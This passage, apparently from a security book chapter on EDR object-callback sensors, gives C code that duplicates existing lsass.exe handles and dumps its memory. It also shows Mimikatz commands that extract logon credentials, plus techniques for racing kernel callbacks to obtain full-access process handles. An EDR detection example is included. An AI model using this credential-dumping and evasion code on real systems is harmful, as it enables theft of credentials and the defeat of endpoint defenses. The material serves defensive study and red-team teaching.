    if (status != STATUS_SUCCESS)&#13;
    {&#13;
        return NULL;&#13;
    }&#13;
}</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 4-10: Retrieving the table of handles</span></p>&#13;
<p class="TX">By passing the <samp class="SANS_TheSansMonoCd_W5Regular_11">SystemHandleInformation</samp> information class to this function <span class="CodeAnnotation" aria-label="annotation1">❶</span>, the user can retrieve an array containing all the active handles on the system. After this function completes, it will store the array in a member variable of the <samp class="SANS_TheSansMonoCd_W5Regular_11">SYSTEM_HANDLE_INFORMATION</samp> structure <span class="CodeAnnotation" aria-label="annotation2">❷</span>.</p>&#13;
<p class="TX">Next, the malware could iterate over the array of handles, as shown in <a href="#list4-11">Listing 4-11</a>, and filter out those it can’t use.</p>&#13;
<pre id="list4-11"><code>for (DWORD i = 0; i &lt; pHandleInfo-&gt;NumberOfHandles; i++)&#13;
{&#13;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = pHandleInfo-&gt;Handles[i];&#13;
&#13;
  <span class="CodeAnnotationCode-1" aria-label="annotation1">❶</span> if (handleInfo.UniqueProcessId != g_dwLsassPid &amp;&amp; handleInfo.UniqueProcessId != 4)&#13;
  {&#13;
      HANDLE hTargetProcess = OpenProcess(&#13;
          PROCESS_DUP_HANDLE,&#13;
          FALSE,&#13;
          handleInfo.UniqueProcessId);&#13;
&#13;
      if (hTargetProcess == NULL)&#13;
      {&#13;
          continue;&#13;
      }&#13;
&#13;
      HANDLE hDuplicateHandle = NULL;&#13;
        if (!DuplicateHandle(&#13;
          hTargetProcess,&#13;
          (HANDLE)handleInfo.HandleValue,&#13;
          GetCurrentProcess(),&#13;
          &amp;hDuplicateHandle,&#13;
          0, 0, DUPLICATE_SAME_ACCESS))&#13;
      {&#13;
          continue;&#13;
      }&#13;
&#13;
      status = NtQueryObject(&#13;
          hDuplicateHandle,&#13;
          ObjectTypeInformation,&#13;
          NULL, 0, &amp;ulReturnLength);&#13;
      if (status == STATUS_INFO_LENGTH_MISMATCH)&#13;
      {&#13;
          PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInfo =&#13;
              (PPUBLIC_OBJECT_TYPE_INFORMATION)malloc(ulReturnLength);&#13;
          if (!pObjectTypeInfo)&#13;
          {&#13;
              break;&#13;
          }<span role="doc-pagebreak" epub:type="pagebreak" id="pg_71" aria-label=" Page 71. "/>&#13;
&#13;
          status = NtQueryObject(&#13;
              hDuplicateHandle,&#13;
            <span class="CodeAnnotationCode-1" aria-label="annotation2">❷</span> ObjectTypeInformation,&#13;
              pObjectTypeInfo,&#13;
              ulReturnLength,&#13;
              &amp;ulReturnLength);&#13;
          if (status != STATUS_SUCCESS)&#13;
          {&#13;
              continue;&#13;
          }&#13;
&#13;
        <span class="CodeAnnotationCode-1" aria-label="annotation3">❸</span> if (!_wcsicmp(pObjectTypeInfo-&gt;TypeName.Buffer, L"Process"))&#13;
          {&#13;
              <var>--snip--</var>&#13;
          }&#13;
          free(pObjectTypeInfo);&#13;
      }&#13;
    }&#13;
}</code></pre>&#13;
<p class="CodeListingCaptionWide"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 4-11: Filtering only for process handles</span></p>&#13;
<p class="TX">We first make sure that neither <i>lsass.exe</i> nor the system process owns the handle <span class="CodeAnnotation" aria-label="annotation1">❶</span>, as this could trigger some alerting logic. We then call <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!NtQueryObject()</samp>, passing in <samp class="SANS_TheSansMonoCd_W5Regular_11">ObjectTypeInformation</samp> <span class="CodeAnnotation" aria-label="annotation2">❷</span> to get the type of the object to which the handle belongs. Following this, we determine whether the handle is for a process object <span class="CodeAnnotation" aria-label="annotation3">❸</span> so that we can filter out all the other types, such as files and mutexes.</p>&#13;
<p class="TX">After completing this basic filtering, we need to investigate the handles a little more to make sure they have the access rights that we need to dump process memory. <a href="#list4-12">Listing 4-12</a> builds upon the previous code listing.</p>&#13;
<pre id="list4-12"><code>if (!_wcsicmp(pObjectTypeInfo-&gt;TypeName.Buffer, L"Process"))&#13;
{&#13;
    LPWSTR szImageName = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));&#13;
    DWORD dwSize = MAX_PATH * sizeof(WCHAR);&#13;
&#13;
  <span class="CodeAnnotationCode-1" aria-label="annotation1">❶</span> if (QueryFullProcessImageNameW(hDuplicateHandle, 0, szImageName, &amp;dwSize))&#13;
   {&#13;
        if (IsLsassHandle(szImageName) &amp;&amp;&#13;
        (handleEntryInfo.GrantedAccess &amp; PROCESS_VM_READ) == PROCESS_VM_READ &amp;&amp;&#13;
        (handleEntryInfo.GrantedAccess &amp; PROCESS_QUERY_INFORMATION) ==&#13;
            PROCESS_QUERY_INFORMATION)&#13;
        {&#13;
            HANDLE hOutFile = CreateFileW(&#13;
                L"C:\\lsa.dmp",&#13;
                GENERIC_WRITE,&#13;
                0,&#13;
                NULL,&#13;
                CREATE_ALWAYS,&#13;
                0, NULL);<span role="doc-pagebreak" epub:type="pagebreak" id="pg_72" aria-label=" Page 72. "/>&#13;
&#13;
        <span class="CodeAnnotationCode-1" aria-label="annotation2">❷</span> if (MiniDumpWriteDump(&#13;
                  hDuplicateHandle,&#13;
                  dwLsassPid,&#13;
                  hOutFile,&#13;
                  MiniDumpWithFullMemory,&#13;
                  NULL, NULL, NULL))&#13;
          {&#13;
              break;&#13;
          }&#13;
&#13;
          CloseHandle(hOutFile);&#13;
        }&#13;
   }&#13;
}</code></pre>&#13;
<p class="CodeListingCaptionWide"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 4-12: Evaluating duplicated handles and dumping memory</span></p>&#13;
<p class="TX">We first get the image name for the process <span class="CodeAnnotation" aria-label="annotation1">❶</span> and pass it to an internal function, <samp class="SANS_TheSansMonoCd_W5Regular_11">IsLsassHandle()</samp>, which makes sure that the process handle is for <i>lsass.exe</i>. Next, we check the handle’s access rights, looking for <samp class="SANS_TheSansMonoCd_W5Regular_11">PROCESS_VM _READ</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">PROCESS_QUERY_INFORMATION</samp>, because the API we’ll use to read <i>lsass.exe</i>’s process memory requires these. If we find an existing handle to <i>lsass.exe</i> with the required access rights, we pass the duplicated handle to the API and extract its information <span class="CodeAnnotation" aria-label="annotation2">❷</span>.</p>&#13;
<p class="TX">Using this new handle, we could create and process an <i>lsass.exe</i> memory dump with a tool such as Mimikatz. <a href="#list4-13">Listing 4-13</a> shows this workflow.</p>&#13;
<pre id="list4-13"><code>C:\&gt; <b>HandleDuplication.exe</b>&#13;
LSASS PID: 884&#13;
[+] Found a handle with the required rights!&#13;
 Owner PID: 17600&#13;
 Handle Value: 0xff8&#13;
 Granted Access: 0x1fffff&#13;
[&gt;] Dumping LSASS memory to the DMP file…&#13;
[+] Dumped LSASS memory C:\lsa.dmp&#13;
&#13;
C:\&gt; <b>mimikatz.exe</b>&#13;
&#13;
mimikatz # <b>sekurlsa::minidump C:\lsa.dmp</b>&#13;
Switch to MINIDUMP : 'C:\lsa.dmp'&#13;
&#13;
mimikatz # <b>sekurlsa::logonpasswords</b>&#13;
Opening : 'C:\lsa.dmp' file for minidump…&#13;
&#13;
Authentication Id : 0 ; 6189696 (00000000:005e7280)&#13;
Session           : RemoteInteractive from 2&#13;
User Name         : highpriv&#13;
Domain            : MILKYWAY&#13;
Logon Server      : SUN&#13;
<var>--snip--</var></code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 4-13: Dumping</span> <span class="eSANS_Futura_Std_Book_11a">lsass.exe’</span><span class="eSANS_Futura_Std_Book_Oblique_I_11a">s memory and processing the minidump with Mimikatz</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_73" aria-label=" Page 73. "/>As you can see, our tool determines that PID 17600, which corresponds to Process Explorer on my test host, had a handle to <i>lsass.exe</i> with the <samp class="SANS_TheSansMonoCd_W5Regular_11">PROCESS_ALL_ACCESS</samp> access mask (0x1FFFFF). We use this handle to dump the memory to a file, <i>C:\lsa.dmp</i>. Next, we run Mimikatz and use it to process the file, then use the <samp class="SANS_TheSansMonoCd_W5Regular_11">sekurlsa::logonpasswords</samp> command to extract credential material. Note that we could perform these Mimikatz steps off-target to reduce our risk of detection, as we’re working with a file and not live memory.</p>&#13;
<p class="TX">While this technique would evade certain sensors, an EDR could still detect our behavior in plenty of ways. Remember that object callbacks might receive notifications about duplication requests. <a href="#list4-14">Listing 4-14</a> shows what this detection logic could look like in an EDR’s driver.</p>&#13;
<pre id="list4-14"><code>OB_PREOP_CALLBACK_STATUS ObjectNotificationCallback(&#13;
    PVOID RegistrationContext,&#13;
    POB_PRE_OPERATION_INFORMATION Info)&#13;
{&#13;
    NTSTATUS status = STATUS_SUCCESS;&#13;
 <span class="CodeAnnotationCode" aria-label="annotation1">❶</span> if (Info-&gt;ObjectType == *PsProcessType)&#13;
    {&#13;
        if (Info-&gt;Operation == OB_OPERATION_HANDLE_DUPLICATE)&#13;
        {&#13;
            PUNICODE_STRING psTargetProcessName = HelperGetProcessName(&#13;
              (PEPROCESS)Info-&gt;Object);&#13;
            if (!psTargetProcessName))&#13;
            {&#13;
                return OB_PREOP_SUCCESS;&#13;
            }&#13;
&#13;
            UNICODE_STRING sLsaProcessName = RTL_CONSTANT_STRING(L"lsass.exe");&#13;
          <span class="CodeAnnotationCode-1" aria-label="annotation2">❷</span> if (FsRtlAreNamesEqual(psTargetProcessName, &amp;sLsaProcessName, TRUE, NULL))&#13;
            {&#13;
              <var>--snip--</var>&#13;
            }&#13;
        }&#13;
    }&#13;
    <var>--snip--</var>&#13;
}</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 4-14: Filtering handle-duplication events on the target process name</span></p>&#13;
<p class="TX">To detect duplication requests, the EDR could determine whether the <samp class="SANS_TheSansMonoCd_W5Regular_11">ObjectType</samp> member of the <samp class="SANS_TheSansMonoCd_W5Regular_11">OB_PRE_OPERATION_INFORMATION</samp> structure, which gets passed to the callback routine, is <samp class="SANS_TheSansMonoCd_W5Regular_11">PsProcessType</samp> and, if so, whether its <samp class="SANS_TheSansMonoCd_W5Regular_11">Operation</samp> member is <samp class="SANS_TheSansMonoCd_W5Regular_11">OB_OPERATION_HANDLE_DUPLICATE</samp> <span class="CodeAnnotation" aria-label="annotation1">❶</span>. Using additional filtering, we could determine whether we’re potentially looking at the technique described earlier. We might then compare the name of the target process with the name of a sensitive process, or a list of them <span class="CodeAnnotation" aria-label="annotation2">❷</span>.</p>&#13;
<p class="TX">A driver that implements this check will detect process-handle duplication performed with <samp class="SANS_TheSansMonoCd_W5Regular_11">kernel32!DuplicateHandle()</samp>. <a href="#fig4-1">Figure 4-1</a> shows a mock EDR reporting the event.</p><span role="doc-pagebreak" epub:type="pagebreak" id="pg_74" aria-label=" Page 74. "/>&#13;
<figure class="IMG"><img id="fig4-1" class="img100" src="../images/Figure4-1.png" alt=""/>&#13;
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 4-1: Detecting process-handle duplication</samp></p></figcaption>&#13;
</figure>&#13;
<p class="TX">Unfortunately, at the time of this writing, many sensors perform checks only on new handle requests and not on duplicate requests. This may change in the future, however, so always evaluate whether the EDR’s driver performs this check.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec8">&#13;
<h3 class="H2" id="sec8"><span id="h-52"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Racing the Callback Routine</samp></h3>&#13;
<p class="TNI">In their 2020 paper “Fast and Furious: Outrunning Windows Kernel Notification Routines from User-Mode,” Pierre Ciholas, Jose Miguel Such, Angelos K. Marnerides, Benjamin Green, Jiajie Zhang, and Utz Roedig demonstrated a novel approach to evading detection by object callbacks. Their technique involves requesting a handle to a process before execution has been passed to the driver’s callback routine. The authors described two separate ways of racing callback routines, covered in the sections that follow.</p>&#13;
<section epub:type="division" aria-labelledby="sec9">&#13;
<h4 class="H3" id="sec9"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Creating a Job Object on the Parent Process</samp></h4>&#13;
<p class="TNI">The first technique works in situations when an attacker wants to gain access to a process whose parent is known. For example, when a user double-clicks an application in the Windows GUI, its parent process should be <i>explorer.exe</i>. In those cases, the attacker definitively knows the parent of their target process, allowing them to use some Windows magic, which we’ll discuss shortly, to open a handle to the target child process before the driver has time to act. <a href="#list4-15">Listing 4-15</a> shows this technique in action.</p>&#13;
<pre id="list4-15"><code>int main(int argc, char* argv[])&#13;
{&#13;
    HANDLE hParent = INVALID_HANDLE_VALUE;&#13;
    HANDLE hIoCompletionPort = INVALID_HANDLE_VALUE;&#13;
    HANDLE hJob = INVALID_HANDLE_VALUE;&#13;
    JOBOBJECT_ASSOCIATE_COMPLETION_PORT jobPort;&#13;
    HANDLE hThread = INVALID_HANDLE_VALUE;&#13;
&#13;
    <var>--snip--</var>&#13;
&#13;
    hParent = OpenProcess(PROCESS_ALL_ACCESS, true, atoi(argv[1]));&#13;
&#13;
 <span class="CodeAnnotationCode" aria-label="annotation1">❶</span> hJob = CreateJobObjectW(nullptr, L"DriverRacer");&#13;
&#13;
    hIoCompletionPort = <span class="CodeAnnotationCode-1" aria-label="annotation2">❷</span> CreateIoCompletionPort(&#13;
        INVALID_HANDLE_VALUE,&#13;
        nullptr,&#13;
        0, 0&#13;
    );<span role="doc-pagebreak" epub:type="pagebreak" id="pg_75" aria-label=" Page 75. "/>&#13;
&#13;
    jobPort = JOBOBJECT_ASSOCIATE_COMPLETION_PORT{&#13;
        INVALID_HANDLE_VALUE,&#13;
        hIoCompletionPort&#13;
    };&#13;
&#13;
    if (!SetInformationJobObject(&#13;
        hJob,&#13;
        JobObjectAssociateCompletionPortInformation,&#13;
        &amp;jobPort,&#13;
        sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT)&#13;
    ))&#13;
    {&#13;
        return GetLastError();&#13;
    }&#13;
&#13;
    if (!AssignProcessToJobObject(hJob, hParent))&#13;
    {&#13;
        return GetLastError();&#13;
    }&#13;
&#13;
    hThread = CreateThread(&#13;
        nullptr, 0,&#13;
     <span class="CodeAnnotationCode" aria-label="annotation3">❸</span> (LPTHREAD_START_ROUTINE)GetChildHandles,&#13;
        &amp;hIoCompletionPort,&#13;
        0, nullptr&#13;
    );&#13;
&#13;
    WaitForSingleObject(hThread, INFINITE);&#13;
&#13;
    <var>--snip--</var>&#13;
}</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 4-15: Setting up a job object and I/O completion port to be queried</span></p>&#13;
<p class="TX">To gain a handle to a protected process, the operator creates a job object on the known parent <span class="CodeAnnotation" aria-label="annotation1">❶</span>. As a result, the process that placed the job object will be notified of any new child processes created through an I/O completion port <span class="CodeAnnotation" aria-label="annotation2">❷</span>. The malware process must then query this I/O completion port as quickly as possible. In our example, the internal <samp class="SANS_TheSansMonoCd_W5Regular_11">GetChildHandles()</samp> function <span class="CodeAnnotation" aria-label="annotation3">❸</span>, expanded in <a href="#list4-16">Listing 4-16</a>, does just that.</p>&#13;
<pre id="list4-16"><code>void GetChildHandles(HANDLE* hIoCompletionPort)&#13;
{&#13;
    DWORD dwBytes = 0;&#13;
    ULONG_PTR lpKey = 0;&#13;
    LPOVERLAPPED lpOverlapped = nullptr;&#13;
    HANDLE hChild = INVALID_HANDLE_VALUE;&#13;
    WCHAR pszProcess[MAX_PATH];&#13;
&#13;
    do&#13;
    {&#13;
        if (dwBytes == 6)&#13;
        {&#13;
            hChild = OpenProcess(<span role="doc-pagebreak" epub:type="pagebreak" id="pg_76" aria-label=" Page 76. "/>&#13;
                PROCESS_ALL_ACCESS,&#13;
                true,&#13;
             <span class="CodeAnnotationCode" aria-label="annotation1">❶</span> (DWORD)lpOverlapped&#13;
            );&#13;
&#13;
         <span class="CodeAnnotationCode" aria-label="annotation2">❷</span> GetModuleFileNameExW(&#13;
                hChild,&#13;
                nullptr,&#13;
                pszProcess,&#13;
                MAX_PATH&#13;
            );&#13;
&#13;
            wprintf(L"New child handle:\n"&#13;
                "PID: %u\n"&#13;
                "Handle: %p\n"&#13;
                "Name: %ls\n\n",&#13;
                DWORD(lpOverlapped),&#13;
                hChild,&#13;
                pszProcess&#13;
            );&#13;
        }&#13;
&#13;
 <span class="CodeAnnotationCode" aria-label="annotation3">❸</span> } while (GetQueuedCompletionStatus(&#13;
        *hIoCompletionPort,&#13;
        &amp;dwBytes,&#13;
        &amp;lpKey,&#13;
        &amp;lpOverlapped,&#13;
        INFINITE));&#13;
}</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 4-16: Opening new process handles</span></p>&#13;
<p class="TX">In this function, we first check the I/O completion port in a <samp class="SANS_TheSansMonoCd_W5Regular_11">do…while</samp> loop <span class="CodeAnnotation" aria-label="annotation3">❸</span>. If we see that bytes have been transferred as part of a completed operation, we open a new handle to the returned PID <span class="CodeAnnotation" aria-label="annotation1">❶</span>, requesting full rights (in other words, <samp class="SANS_TheSansMonoCd_W5Regular_11">PROCESS_ALL_ACCESS</samp>). If we receive a handle, we check its image name <span class="CodeAnnotation" aria-label="annotation2">❷</span>. Real malware would do something with this handle, such as read its memory or terminate it, but here we just print some information about it instead.</p>&#13;
<p class="TX">This technique works because the notification to the job object occurs before the object-callback notification in the kernel. In their paper, the researchers measured the time between process-creation and object-callback notification to be 8.75–14.5 ms. This means that if a handle is requested before the notification is passed to the driver, the attacker can obtain a fully privileged handle as opposed to one whose access mask has been changed by the driver.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec10">&#13;
<h4 class="H3" id="sec10"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Guessing the PID of the Target Process</samp></h4>&#13;
<p class="TNI">The second technique described in the paper attempts to predict the PID of the target process. By removing all known PIDs and thread IDs (TIDs) from the list of potential PIDs, the authors showed that it is possible to <span role="doc-pagebreak" epub:type="pagebreak" id="pg_77" aria-label=" Page 77. "/>more efficiently guess the PID of the target process. To demonstrate this, they created a proof-of-concept program called <i>hThemAll.cpp</i>. At the core of their tool is the internal function <samp class="SANS_TheSansMonoCd_W5Regular_11">OpenProcessThemAll()</samp>, shown in <a href="#list4-17">Listing 4-17</a>, which the program executes across four concurrent threads to open process handles.</p>&#13;
<pre id="list4-17"><code>void OpenProcessThemAll(&#13;
    const DWORD dwBasePid,&#13;
    const DWORD dwNbrPids,&#13;
    std::list&lt;HANDLE&gt;* lhProcesses,&#13;
    const std::vector&lt;DWORD&gt;* vdwExistingPids)&#13;
{&#13;
    std::list&lt;DWORD&gt; pids;&#13;
    for (auto i(0); i &lt; dwNbrPids; i += 4)&#13;
        if (!std::binary_search(&#13;
            vdwExistingPids-&gt;begin(),&#13;
            vdwExistingPids-&gt;end(),&#13;
            dwBasePid + i))&#13;
        {&#13;
            pids.push_back(dwBasePid + i);&#13;
        }&#13;
&#13;
    while (!bJoinThreads) {&#13;
        for (auto it = pids.begin(); it != pids.end(); ++it)&#13;
        {&#13;
          <span class="CodeAnnotationCode-1" aria-label="annotation1">❶</span> if (const auto hProcess = OpenProcess(&#13;
                DESIRED_ACCESS,&#13;
                DESIRED_INHERITANCE,&#13;
                *it))&#13;
            {&#13;
                  EnterCriticalSection(&amp;criticalSection);&#13;
                <span class="CodeAnnotationCode-1" aria-label="annotation2">❷</span> lhProcesses-&gt;push_back(hProcess);&#13;
                  LeaveCriticalSection(&amp;criticalSection);&#13;
                  pids.erase(it);&#13;
            }&#13;
        }&#13;
    }&#13;
}</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 4-17: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">OpenProcessThemAll()</samp> function used to request handles to processes and check their PIDs</span></p>&#13;
<p class="TX">This function indiscriminately requests handles <span class="CodeAnnotation" aria-label="annotation1">❶</span> to all processes via their PIDs in a filtered list. If the handle returned is valid, it is added to an array <span class="CodeAnnotation" aria-label="annotation2">❷</span>. After this function completes, we can check whether any of the handles returned match the target process. If the handle does not match the target, it is closed.</p>&#13;
<p class="TX">While the proof of concept is functional, it misses some edge cases, such as the reuse of process and thread identifiers by another process or thread after one terminates. It is absolutely possible to cover these, but no public examples of doing so exist at the time of this writing.</p>&#13;
<p class="TX">Both of these techniques’ operational use cases may also be limited. For instance, if we wanted to use the first technique to open a handle to the <span role="doc-pagebreak" epub:type="pagebreak" id="pg_78" aria-label=" Page 78. "/>agent process, we’d need to run our code before that process starts. This would be very challenging to pull off on a real system because most EDRs start their agent process via a service that runs early in the boot order. We’d need administrative rights to create our own service, and that still doesn’t guarantee that we’d be able to get our malware running before the agent service starts.</p>&#13;
<p class="TX">Additionally, both techniques focus on defeating the EDR’s preventive controls and do not take into consideration its detective controls. Even if the driver is unable to modify the privileges of the requested handle, it might still report suspicious process-access events. Microsoft has stated that it won’t fix this issue, as doing so could cause application-compatibility problems; instead, third-party developers are responsible for mitigation.</p>&#13;
</section>&#13;
</section>&#13;
</section>&#13;
<section epub:type="conclusion" role="doc-conclusion" aria-labelledby="sec11">&#13;
<h2 class="H1" id="sec11"><span id="h-53"/><samp class="SANS_Futura_Std_Bold_B_11">Conclusion</samp></h2>&#13;
<p class="TNI">Monitoring handle operations, especially handles being opened to sensitive processes, provides a robust way to detect adversary tradecraft. A driver with a registered object-notification callback stands directly inline of an adversary whose tactics rely on opening or duplicating handles to things such as <i>lsass.exe</i>. When this callback routine is implemented well, the opportunities for evading this sensor are limited, and many attackers have adapted their tradecraft to limit the need to open new handles to processes altogether.</p>&#13;
</section>&#13;
</section>&#13;
</body></html>